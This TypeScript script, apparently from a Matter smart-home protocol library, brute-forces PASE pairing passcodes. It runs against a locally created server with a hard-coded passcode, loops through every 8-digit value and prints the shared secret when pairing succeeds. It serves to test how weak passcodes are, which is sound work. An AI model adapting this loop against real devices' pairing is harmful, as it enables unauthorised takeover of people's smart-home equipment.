import { PaseClient } from "./PaseClient";
import { PaseServer } from "./PaseServer";
import { PbkdfParameters } from "../../crypto/Spake2p";
import { ByteArray } from "../../util/ByteArray";
import { Crypto } from "../../crypto/Crypto";
import { CryptoNode } from "../../crypto/CryptoNode";
import { FORBIDDEN_PASSCODES } from "./forbiddenPasscodes";

// initializing the cryptographic provider
const TheCrypto = new CryptoNode();
Crypto.get = () => TheCrypto;

// function to brute-force all possible Passcodes
async function bruteForcePasscode() {
  // initializing PBKDF parameters
  const pbkdfParameters: PbkdfParameters = {
    iterations: 100000,
    salt: ByteArray.fromString('asalt'), // example salt
  };

  // creating server object with a known setup Passcode
  const correctPasscode = 250; // correct Passcode used by the server (hard coded for the moment)
  const server = new PaseServer(correctPasscode, pbkdfParameters);

  // creating client object which has no knowledge of the Passcode
  const client = new PaseClient();

  // iterating over all possible Passcodes from 00000001 to 99999998
  for (let passcode = 1; passcode <= 99999998; passcode++) {
    // not trying if invalid passcode
    if (!FORBIDDEN_PASSCODES.includes(passcode)) {
      // formatting the Passcode to ensure it is zero-padded to 8 digits
      const passcodeString = passcode.toString().padStart(8, "0");
      const passcodeNumber = parseInt(passcodeString, 10);

      try {
        // attempting pairing with the current Passcode
        const sharedSecret = await client.initiatePairing(
          passcodeNumber,
          pbkdfParameters,
          server
        );
        console.log(`Pairing succeeded with Passcode: ${passcodeString}`);
        console.log("Shared Secret:", sharedSecret);
        return; // we exit the loop when pairing succeeds!
      } catch (error) {
        // if pairing fails, we continue with the next Passcode
        console.log(`Pairing failed with Passcode: ${passcodeString}`);
        console.log("-----------------------------"); // just to separate the logs of each attempt
      }
    }
  }

  console.log("Brute-force attempt completed. No valid Passcode found.");
}

// running the brute-force function
bruteForcePasscode();
